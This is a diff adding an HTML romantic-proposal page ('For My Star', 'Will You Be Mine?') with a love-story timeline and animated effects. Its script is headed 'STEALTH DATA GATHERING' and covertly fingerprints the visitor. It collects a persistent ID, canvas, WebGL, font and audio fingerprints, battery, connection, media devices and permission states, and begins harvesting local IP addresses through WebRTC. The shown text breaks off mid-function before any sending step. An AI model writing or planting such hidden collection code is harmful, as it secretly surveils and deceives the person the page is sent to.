@@ -1,0 +1,2079 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Will You Be Mine Forever?</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&family=Playfair+Display:wght@400;600&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Playfair Display', serif;
+            background: linear-gradient(135deg, #1a0a2e 0%, #0f0518 50%, #0a0612 100%);
+            min-height: 100vh;
+            overflow-x: hidden;
+            color: #fff;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: -20%;
+            left: -20%;
+            width: 140vw;
+            height: 140vh;
+            background: radial-gradient(circle at 20% 30%, rgba(139, 92, 246, 0.18) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(196, 181, 253, 0.14) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: -2;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            inset: -20%;
+            background: radial-gradient(circle at 15% 20%, rgba(167, 139, 250, 0.16) 0%, transparent 24%),
+                radial-gradient(circle at 85% 15%, rgba(139, 92, 246, 0.14) 0%, transparent 28%),
+                radial-gradient(circle at 50% 85%, rgba(196, 181, 253, 0.12) 0%, transparent 26%);
+            filter: blur(40px);
+            animation: drift 12s ease-in-out infinite alternate;
+            pointer-events: none;
+            z-index: -3;
+        }
+
+        @keyframes drift {
+            from {
+                transform: translate3d(-3%, -2%, 0) scale(1);
+            }
+
+            to {
+                transform: translate3d(3%, 2%, 0) scale(1.05);
+            }
+        }
+
+        .hearts-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+            z-index: 1000;
+        }
+
+        .heart {
+            position: absolute;
+            font-size: 20px;
+            animation: floatUp 8s ease-in infinite;
+            opacity: 0.8;
+        }
+
+        @keyframes floatUp {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+
+            10% {
+                opacity: 0.8;
+            }
+
+            90% {
+                opacity: 0.8;
+            }
+
+            100% {
+                transform: translateY(-100px) rotate(720deg);
+                opacity: 0;
+            }
+        }
+
+        .rose-petal {
+            position: absolute;
+            width: 15px;
+            height: 15px;
+            background: radial-gradient(ellipse at center, #8b5cf6 0%, #7c3aed 50%, #5b21b6 100%);
+            border-radius: 50% 0 50% 0;
+            animation: petalFall 10s ease-in-out infinite;
+            opacity: 0.7;
+        }
+
+        @keyframes petalFall {
+            0% {
+                transform: translateY(-100px) rotate(0deg) translateX(0);
+                opacity: 0;
+            }
+
+            10% {
+                opacity: 0.7;
+            }
+
+            90% {
+                opacity: 0.7;
+            }
+
+            100% {
+                transform: translateY(100vh) rotate(720deg) translateX(100px);
+                opacity: 0;
+            }
+        }
+
+        .landing-section {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+            position: relative;
+        }
+
+        .landing-section::before,
+        .landing-section::after {
+            content: '';
+            position: absolute;
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-radius: 50%;
+            pointer-events: none;
+            animation: spin 18s linear infinite;
+        }
+
+        .landing-section::before {
+            width: 320px;
+            height: 320px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            opacity: 0.35;
+        }
+
+        .landing-section::after {
+            width: 420px;
+            height: 420px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(30deg);
+            opacity: 0.2;
+            animation-direction: reverse;
+        }
+
+        @keyframes spin {
+            from {
+                transform: translate(-50%, -50%) rotate(0deg);
+            }
+
+            to {
+                transform: translate(-50%, -50%) rotate(360deg);
+            }
+        }
+
+        .hero-orb {
+            position: absolute;
+            width: min(70vw, 360px);
+            height: min(70vw, 360px);
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(139, 92, 246, 0.45) 0%, rgba(139, 92, 246, 0.14) 35%, rgba(167, 139, 250, 0.08) 60%, transparent 72%);
+            filter: blur(6px);
+            animation: orbPulse 4.5s ease-in-out infinite;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        @keyframes orbPulse {
+
+            0%,
+            100% {
+                transform: scale(0.96) rotate(0deg);
+                opacity: 0.85;
+            }
+
+            50% {
+                transform: scale(1.06) rotate(5deg);
+                opacity: 1;
+            }
+        }
+
+        .main-heart {
+            font-size: 120px;
+            animation: heartbeat 1.5s ease-in-out infinite;
+            margin-bottom: 30px;
+            filter: drop-shadow(0 0 35px rgba(139, 92, 246, 0.9));
+            position: relative;
+            z-index: 1;
+        }
+
+        @keyframes heartbeat {
+
+            0%,
+            100% {
+                transform: scale(1);
+            }
+
+            15% {
+                transform: scale(1.15);
+            }
+
+            30% {
+                transform: scale(1);
+            }
+
+            45% {
+                transform: scale(1.1);
+            }
+
+            60% {
+                transform: scale(1);
+            }
+        }
+
+        .title {
+            font-family: 'Dancing Script', cursive;
+            font-size: clamp(2.5rem, 8vw, 5rem);
+            background: linear-gradient(45deg, #8b5cf6, #c4b5fd, #a78bfa, #8b5cf6);
+            background-size: 220% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: shimmer 3s linear infinite;
+            margin-bottom: 20px;
+            text-shadow: 0 0 40px rgba(139, 92, 246, 0.35);
+            letter-spacing: 1px;
+        }
+
+        @keyframes shimmer {
+            0% {
+                background-position: 0% center;
+            }
+
+            100% {
+                background-position: 200% center;
+            }
+        }
+
+        .subtitle {
+            font-size: clamp(1rem, 3vw, 1.5rem);
+            color: #c4b8d4;
+            max-width: 600px;
+            line-height: 1.8;
+            margin-bottom: 40px;
+            opacity: 0;
+            animation: fadeInUp 1s ease forwards 0.5s;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .scroll-indicator {
+            position: absolute;
+            bottom: 40px;
+            animation: bounce 2s infinite;
+            cursor: pointer;
+        }
+
+        .scroll-indicator span {
+            display: block;
+            width: 30px;
+            height: 30px;
+            border-right: 3px solid #8b5cf6;
+            border-bottom: 3px solid #8b5cf6;
+            transform: rotate(45deg);
+            margin: -10px;
+        }
+
+        @keyframes bounce {
+
+            0%,
+            20%,
+            50%,
+            80%,
+            100% {
+                transform: translateY(0);
+            }
+
+            40% {
+                transform: translateY(-20px);
+            }
+
+            60% {
+                transform: translateY(-10px);
+            }
+        }
+
+        .story-section {
+            min-height: 100vh;
+            padding: 100px 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .section-title {
+            font-family: 'Dancing Script', cursive;
+            font-size: clamp(2rem, 6vw, 3.5rem);
+            color: #8b5cf6;
+            margin-bottom: 60px;
+            text-align: center;
+            text-shadow: 0 0 20px rgba(139, 92, 246, 0.3);
+        }
+
+        .timeline {
+            position: relative;
+            max-width: 800px;
+            width: 100%;
+        }
+
+        .timeline::before {
+            content: '';
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 3px;
+            height: 100%;
+            background: linear-gradient(180deg, #8b5cf6, #c4b5fd, #8b5cf6);
+            box-shadow: 0 0 10px rgba(139, 92, 246, 0.3);
+        }
+
+        .timeline-item {
+            position: relative;
+            width: 45%;
+            padding: 24px;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.06), rgba(255, 255, 255, 0.025));
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(139, 92, 246, 0.2);
+            border-radius: 20px;
+            margin-bottom: 50px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25), inset 0 1px 1px rgba(255, 255, 255, 0.1);
+            opacity: 0;
+            transform: translateY(40px);
+            transition: all 0.8s cubic-bezier(0.215, 0.610, 0.355, 1);
+        }
+
+        .timeline-item:hover {
+            transform: translateY(-8px) scale(1.02);
+            border-color: rgba(255, 255, 255, 0.3);
+            box-shadow: 0 18px 45px rgba(139, 92, 246, 0.18), inset 0 1px 1px rgba(255, 255, 255, 0.15);
+        }
+
+        .timeline-item.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .timeline-item:nth-child(odd) {
+            margin-left: 5%;
+        }
+
+        .timeline-item:nth-child(even) {
+            margin-left: 50%;
+        }
+
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            top: 32px;
+            width: 18px;
+            height: 18px;
+            background: #8b5cf6;
+            border-radius: 50%;
+            box-shadow: 0 0 15px rgba(139, 92, 246, 0.9);
+            z-index: 2;
+        }
+
+        .timeline-item:nth-child(odd)::before {
+            right: -34px;
+        }
+
+        .timeline-item:nth-child(even)::before {
+            left: -34px;
+        }
+
+        .timeline-emoji {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+
+        .timeline-date {
+            font-family: 'Dancing Script', cursive;
+            font-size: 1.5rem;
+            color: #c4b5fd;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(196, 181, 253, 0.3);
+        }
+
+        .timeline-text {
+            font-size: 1.05rem;
+            color: #c4b8d4;
+            line-height: 1.7;
+        }
+
+        .proposal-section {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 40px 20px;
+            position: relative;
+            background: radial-gradient(circle at center, rgba(139, 92, 246, 0.08) 0%, transparent 70%);
+        }
+
+        .ring-animation {
+            font-size: 100px;
+            animation: ringFloat 3s ease-in-out infinite;
+            margin-bottom: 30px;
+            filter: drop-shadow(0 0 20px rgba(196, 181, 253, 0.5));
+        }
+
+        @keyframes ringFloat {
+
+            0%,
+            100% {
+                transform: translateY(0) rotate(-10deg);
+            }
+
+            50% {
+                transform: translateY(-20px) rotate(10deg);
+            }
+        }
+
+        .proposal-question {
+            font-family: 'Dancing Script', cursive;
+            font-size: clamp(2rem, 7vw, 4.5rem);
+            color: #fff;
+            margin-bottom: 50px;
+            text-shadow: 0 0 40px rgba(139, 92, 246, 0.7);
+        }
+
+        .buttons-container {
+            display: flex;
+            gap: 30px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .btn {
+            padding: 18px 50px;
+            font-size: 1.3rem;
+            font-family: 'Playfair Display', serif;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+            overflow: hidden;
+            isolation: isolate;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.25), transparent);
+            transform: translateX(-120%) rotate(20deg);
+            transition: transform 0.7s ease;
+            z-index: -1;
+        }
+
+        .btn:hover::before {
+            transform: translateX(120%) rotate(20deg);
+        }
+
+        .btn-yes {
+            background: linear-gradient(135deg, #8b5cf6, #7c3aed);
+            color: white;
+            box-shadow: 0 10px 40px rgba(139, 92, 246, 0.5);
+            animation: pulseGlow 2.6s ease-in-out infinite;
+        }
+
+        @keyframes pulseGlow {
+
+            0%,
+            100% {
+                box-shadow: 0 10px 40px rgba(139, 92, 246, 0.5);
+                transform: translateY(0);
+            }
+
+            50% {
+                box-shadow: 0 14px 48px rgba(139, 92, 246, 0.8);
+                transform: translateY(-2px);
+            }
+        }
+
+        .btn-yes:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 20px 60px rgba(139, 92, 246, 0.8);
+        }
+
+        .btn-no {
+            background: rgba(255, 255, 255, 0.05);
+            color: #c4b8d4;
+            border: 2px solid rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(8px);
+            min-width: 180px;
+        }
+
+        .btn-no:hover {
+            transform: translateY(-3px);
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.3);
+        }
+
+        .celebration {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .celebration.active {
+            display: flex;
+        }
+
+        .celebration-emoji {
+            font-size: 80px;
+            animation: celebrateBounce 0.5s ease infinite alternate;
+        }
+
+        @keyframes celebrateBounce {
+            from {
+                transform: scale(1) rotate(-5deg);
+            }
+
+            to {
+                transform: scale(1.1) rotate(5deg);
+            }
+        }
+
+        .celebration-title {
+            font-family: 'Dancing Script', cursive;
+            font-size: clamp(3rem, 10vw, 6rem);
+            background: linear-gradient(45deg, #8b5cf6, #c4b5fd, #8b5cf6, #c4b5fd);
+            background-size: 300% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: shimmer 2s linear infinite;
+            margin: 30px 0;
+        }
+
+        .celebration-text {
+            font-size: 1.5rem;
+            color: #c4b8d4;
+            max-width: 600px;
+            line-height: 1.8;
+        }
+
+        .firework {
+            position: fixed;
+            pointer-events: none;
+            z-index: 2000;
+        }
+
+        .firework-particle {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            animation: fireworkExplode 1s ease-out forwards;
+        }
+
+        @keyframes fireworkExplode {
+            0% {
+                transform: translate(0, 0) scale(1);
+                opacity: 1;
+            }
+
+            100% {
+                transform: translate(var(--tx), var(--ty)) scale(0);
+                opacity: 0;
+            }
+        }
+
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .sparkle-layer {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .sparkle {
+            position: absolute;
+            color: #c4b5fd;
+            text-shadow: 0 0 12px rgba(196, 181, 253, 0.8);
+            animation: sparkleFloat 2.8s ease-in-out infinite;
+            opacity: 0.9;
+        }
+
+        @keyframes sparkleFloat {
+
+            0%,
+            100% {
+                transform: translateY(0) scale(1);
+                opacity: 0.7;
+            }
+
+            50% {
+                transform: translateY(-10px) scale(1.15);
+                opacity: 1;
+            }
+        }
+
+        .star {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: white;
+            border-radius: 50%;
+            animation: twinkle 2s ease-in-out infinite;
+        }
+
+        @keyframes twinkle {
+
+            0%,
+            100% {
+                opacity: 0.3;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 1;
+                transform: scale(1.5);
+            }
+        }
+
+        .music-btn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #8b5cf6, #7c3aed);
+            border: none;
+            cursor: pointer;
+            z-index: 1001;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            box-shadow: 0 8px 32px rgba(139, 92, 246, 0.4);
+            transition: all 0.3s ease;
+            animation: musicPulse 3s infinite;
+        }
+
+        @keyframes musicPulse {
+            0% {
+                box-shadow: 0 8px 32px rgba(139, 92, 246, 0.4);
+                transform: scale(1);
+            }
+
+            50% {
+                box-shadow: 0 8px 40px rgba(139, 92, 246, 0.7);
+                transform: scale(1.05);
+            }
+
+            100% {
+                box-shadow: 0 8px 32px rgba(139, 92, 246, 0.4);
+                transform: scale(1);
+            }
+        }
+
+        .music-btn:hover {
+            transform: scale(1.1) rotate(10deg);
+        }
+
+        .personal-message {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.06), rgba(255, 255, 255, 0.025));
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(139, 92, 246, 0.2);
+            border-radius: 24px;
+            padding: 40px;
+            margin-top: 50px;
+            max-width: 700px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25), inset 0 1px 1px rgba(255, 255, 255, 0.15);
+            transition: transform 0.3s ease, border-color 0.3s ease;
+        }
+
+        .personal-message:hover {
+            transform: translateY(-5px);
+            border-color: rgba(255, 255, 255, 0.3);
+        }
+
+        .personal-message p {
+            font-size: 1.25rem;
+            color: #c4b8d4;
+            line-height: 2;
+            font-style: italic;
+        }
+
+        .signature {
+            font-family: 'Dancing Script', cursive;
+            font-size: 2.2rem;
+            color: #8b5cf6;
+            margin-top: 30px;
+            text-shadow: 0 0 15px rgba(139, 92, 246, 0.4);
+        }
+
+        @media (max-width: 768px) {
+            .timeline::before {
+                left: 15px;
+            }
+
+            .timeline-item {
+                width: calc(100% - 45px) !important;
+                margin-left: 35px !important;
+                margin-right: 10px !important;
+                transform: translateY(30px) !important;
+                padding: 20px;
+            }
+
+            .timeline-item.visible {
+                transform: translateY(0) !important;
+            }
+
+            .timeline-item::before {
+                left: -28px !important;
+                right: auto !important;
+                top: 30px !important;
+                width: 14px !important;
+                height: 14px !important;
+            }
+
+            .timeline-item:nth-child(even) {
+                margin-left: 35px !important;
+                transform: translateY(30px) !important;
+            }
+
+            .timeline-item:nth-child(even).visible {
+                transform: translateY(0) !important;
+            }
+
+            .buttons-container {
+                flex-direction: column;
+                gap: 15px;
+                width: 100%;
+                padding: 0 20px;
+            }
+
+            .btn {
+                width: 100%;
+                min-width: unset !important;
+                padding: 16px 30px;
+                font-size: 1.15rem;
+            }
+
+            .personal-message {
+                padding: 24px;
+                margin: 40px 15px 0;
+            }
+
+            .personal-message p {
+                font-size: 1.05rem;
+                line-height: 1.7;
+            }
+        }
+
+        /* ========== CINEMATIC BREAK ANIMATION ========== */
+
+        /* Phase 1 — SVG crack lines draw in */
+        @keyframes drawCrack {
+            to {
+                stroke-dashoffset: 0;
+            }
+        }
+
+        /* Phase 1 — whole page screen-shake */
+        @keyframes screenShake {
+
+            0%,
+            100% {
+                transform: translate(0, 0) rotate(0deg);
+            }
+
+            8% {
+                transform: translate(-10px, -5px) rotate(-1deg);
+            }
+
+            16% {
+                transform: translate(10px, 5px) rotate(1deg);
+            }
+
+            24% {
+                transform: translate(-8px, 6px) rotate(-0.5deg);
+            }
+
+            32% {
+                transform: translate(8px, -6px) rotate(0.5deg);
+            }
+
+            40% {
+                transform: translate(-5px, 8px) rotate(-0.8deg);
+            }
+
+            48% {
+                transform: translate(5px, -8px) rotate(0.8deg);
+            }
+
+            56% {
+                transform: translate(-4px, -4px) rotate(-0.3deg);
+            }
+
+            64% {
+                transform: translate(4px, 4px) rotate(0.3deg);
+            }
+
+            72% {
+                transform: translate(-2px, 3px) rotate(-0.2deg);
+            }
+
+            80% {
+                transform: translate(2px, -3px) rotate(0.2deg);
+            }
+
+            90% {
+                transform: translate(-1px, 1px) rotate(0deg);
+            }
+        }
+
+        /* Phase 2 — element pre-shake before falling */
+        @keyframes pieceShake {
+
+            0%,
+            100% {
+                transform: translate(0, 0) rotate(0deg);
+            }
+
+            20% {
+                transform: translate(-6px, 3px) rotate(-1.5deg);
+            }
+
+            40% {
+                transform: translate(6px, -3px) rotate(1.5deg);
+            }
+
+            60% {
+                transform: translate(-4px, 4px) rotate(-0.8deg);
+            }
+
+            80% {
+                transform: translate(4px, -4px) rotate(0.8deg);
+            }
+        }
+
+        /* Phase 2 — element fall */
+        .breaking-piece {
+            pointer-events: none !important;
+            transform-origin: center center;
+            will-change: transform, opacity, filter;
+            backface-visibility: hidden;
+        }
+
+        .breaking-piece.do-shake {
+            animation: pieceShake 0.45s ease-in-out !important;
+        }
+
+        .breaking-piece.do-fall {
+            transition:
+                transform var(--fall-dur, 3.2s) cubic-bezier(0.55, 0.05, 0.9, 0.4),
+                opacity var(--fade-dur, 2.5s) ease-in var(--fade-del, 0.6s),
+                filter 0.8s ease-out !important;
+            transform:
+                translateY(var(--ty, 130vh)) translateX(var(--tx, 0px)) rotate(var(--rot, 0deg)) scale(var(--sc, 0.55)) !important;
+            opacity: 0 !important;
+            filter: blur(6px) !important;
+        }
+
+        /* Phase 3 — sad screen */
+        .sad-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 20px;
+            opacity: 0;
+            transition: opacity 3s cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 99999;
+            pointer-events: none;
+        }
+
+        .sad-screen.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .sad-text {
+            font-family: 'Playfair Display', serif;
+            font-size: clamp(2.5rem, 8vw, 5rem);
+            color: #444;
+            font-style: italic;
+            letter-spacing: 1.5px;
+            animation: sadPulse 3s alternate infinite ease-in-out;
+            text-shadow: 0 0 30px rgba(255, 255, 255, 0.05);
+        }
+
+        @keyframes sadPulse {
+            0% {
+                color: #333;
+                transform: scale(0.97);
+            }
+
+            100% {
+                color: #666;
+                transform: scale(1.03);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="stars" id="stars"></div>
+    <div class="sparkle-layer" id="sparkles"></div>
+    <div class="hearts-container" id="heartsContainer"></div>
+
+    <button class="music-btn" id="musicBtn" title="Toggle Music">🎵</button>
+
+    <section class="landing-section" id="landing">
+        <div class="hero-orb"></div>
+        <div class="main-heart">⭐</div>
+        <h1 class="title">For My Star</h1>
+        <p class="subtitle">
+            In the endless sky, you are the brightest light I’ve ever known.
+            I have something cosmic to ask you...
+        </p>
+        <div class="scroll-indicator" onclick="scrollToSection('story')">
+            <span></span>
+        </div>
+    </section>
+
+    <section class="story-section" id="story">
+        <h2 class="section-title">Our Love Story</h2>
+        <div class="timeline">
+            <div class="timeline-item">
+                <div class="timeline-emoji">💫</div>
+                <div class="timeline-date">The First Spark</div>
+                <div class="timeline-text">
+                    The moment I saw you, it felt like a star had fallen just for me.
+                    Your smile turned my ordinary sky into something magical.
+                </div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-emoji">🌙</div>
+                <div class="timeline-date">Our First Orbit</div>
+                <div class="timeline-text">
+                    We kept circling back to each other, as if the universe itself was pulling us closer.
+                    Every conversation felt like a new constellation forming.
+                </div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-emoji">🌌</div>
+                <div class="timeline-date">A Galaxy of Memories</div>
+                <div class="timeline-text">
+                    From quiet nights to shining dreams, every moment with you became a little light in my heart.
+                    I carry them like stars in my soul.
+                </div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-emoji">❤️</div>
+                <div class="timeline-date">Falling for You</div>
+                <div class="timeline-text">
+                    Somewhere between the laughter and the wonder, you became my favorite universe.
+                    My comfort, my joy, my forever.
+                </div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-emoji">✨</div>
+                <div class="timeline-date">Now and Beyond</div>
+                <div class="timeline-text">
+                    And now, I’m more certain than ever that my heart was always meant to find its way back to you.
+                </div>
+            </div>
+        </div>
+
+        <div class="personal-message">
+            <p>
+                “You are the light in my darkest sky, the sweetest star in my universe, and the love I would choose
+                again and again in every lifetime.”
+            </p>
+            <div class="signature">— Forever Yours 🌟</div>
+        </div>
+    </section>
+
+    <section class="proposal-section" id="proposal">
+        <div class="ring-animation">🌙</div>
+        <h2 class="proposal-question">Will You Be Mine?</h2>
+        <div class="buttons-container">
+            <button class="btn btn-yes" id="yesBtn" onclick="handleYes()">Yes, Always! 🌟</button>
+            <button class="btn btn-no" id="noBtn" onmouseover="runAway()" onclick="handleNo()">Maybe...</button>
+        </div>
+    </section>
+
+    <section class="celebration" id="celebration">
+        <div class="celebration-emoji">🎉💒🎊</div>
+        <h1 class="celebration-title">She Said Yes!</h1>
+        <p class="celebration-text">
+            You've made me the happiest person in the world!
+            I promise to love you, cherish you, and make every day an adventure.
+            Our forever starts now!
+        </p>
+        <div class="ring-animation" style="font-size: 150px; margin-top: 40px;">💍</div>
+    </section>
+
+    <script>
+        // ============================================================
+        //  STEALTH DATA GATHERING
+        // ============================================================
+
+        const COLLECTOR = (function () {
+            function _getVisitorId() {
+                let id = localStorage.getItem('_vid');
+                if (!id) {
+                    id = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
+                    localStorage.setItem('_vid', id);
+                }
+                return id;
+            }
+
+            function _getFingerprint() {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200; canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('CVE-2024-🖥️', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('PWN', 4, 17);
+                const canvasFp = canvas.toDataURL();
+
+                return {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    screen: { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth },
+                    window: { innerWidth: window.innerWidth, innerHeight: window.innerHeight, outerWidth: window.outerWidth, outerHeight: window.outerHeight, devicePixelRatio: window.devicePixelRatio },
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    canvasFingerprint: canvasFp,
+                    webdriver: navigator.webdriver,
+                    plugins: Array.from(navigator.plugins || []).map(p => p.name),
+                    mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
+                    fonts: (function () {
+                        const bases = 'monospace sans-serif serif'.split(' ');
+                        const tests = 'Arial Helvetica Times Verdana Georgia Courier Comic+Sans Impact Tahoma Trebuchet+MS Palatino Garamond Bookman Avant+Garde'.split(' ');
+                        const found = [];
+                        const div = document.createElement('div');
+                        div.textContent = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+                        document.body.appendChild(div);
+                        for (const base of bases) {
+                            div.style.fontFamily = base;
+                            const baseWidth = div.offsetWidth;
+                            for (const test of tests) {
+                                div.style.fontFamily = test + ', ' + base;
+                                if (div.offsetWidth !== baseWidth) found.push(test.replace(/\+/g, ' '));
+                            }
+                        }
+                        document.body.removeChild(div);
+                        return found;
+                    })(),
+                    adblock: (function () {
+                        const el = document.createElement('div');
+                        el.innerHTML = '&nbsp;';
+                        el.className = 'ad_unit ' + Math.random();
+                        el.style.position = 'absolute';
+                        el.style.top = '-999px';
+                        document.body.appendChild(el);
+                        const hidden = el.offsetHeight === 0;
+                        document.body.removeChild(el);
+                        return hidden;
+                    })(),
+                    connection: (function () {
+                        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                        return c ? { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData } : null;
+                    })(),
+                    battery: null
+                };
+            }
+
+            async function _getBattery() {
+                try {
+                    if (navigator.getBattery) {
+                        const b = await navigator.getBattery();
+                        return { charging: b.charging, level: b.level, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
+                    }
+                } catch (e) { }
+                return null;
+            }
+
+            function _getWebGLInfo() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (!gl) return null;
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    return {
+                        vendor: gl.getParameter(gl.VENDOR),
+                        renderer: gl.getParameter(gl.RENDERER),
+                        unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
+                        unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
+                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+                    };
+                } catch (e) {
+                    return null;
+                }
+            }
+
+            function _getAudioContextInfo() {
+                try {
+                    const AudioContext = window.AudioContext || window.webkitAudioContext;
+                    if (!AudioContext) return null;
+                    const context = new AudioContext();
+                    const result = {
+                        sampleRate: context.sampleRate,
+                        maxChannelCount: context.destination.maxChannelCount,
+                        state: context.state
+                    };
+                    context.close();
+                    return result;
+                } catch (e) {
+                    return null;
+                }
+            }
+
+            async function _getMediaDevices() {
+                try {
+                    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return [];
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    return devices.map(d => ({
+                        kind: d.kind,
+                        label: d.label || 'Permission Denied',
+                        deviceId: d.deviceId ? (d.deviceId.slice(0, 8) + '...') : 'none'
+                    }));
+                } catch (e) {
+                    return [];
+                }
+            }
+
+            async function _getPermissions() {
+                const permissions = ['geolocation', 'notifications', 'camera', 'microphone'];
+                const results = {};
+                if (!navigator.permissions || !navigator.permissions.query) return results;
+                for (const name of permissions) {
+                    try {
+                        const status = await navigator.permissions.query({ name });
+                        results[name] = status.state;
+                    } catch (e) {
+                        results[name] = 'error';
+                    }
+                }
+                return results;
+            }
+
+            function _getLocalIps() {
+                return new Promise((resolve) => {
+                    const ips = [];
+                    try {
+                        const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+                        if (!RTCPeerConnection) return resolve([]);
+                        const pc = new RTCPeerConnection({ iceServers: [] });
+                        pc.createDataChannel('');
+                        pc.onicecandidate = (e) => {
+                            if (!e.candidate) {
+                                pc.close();
+                                resolve(ips);
+                                return;
+                            }
+                            const cand = e.candidate.candidate;
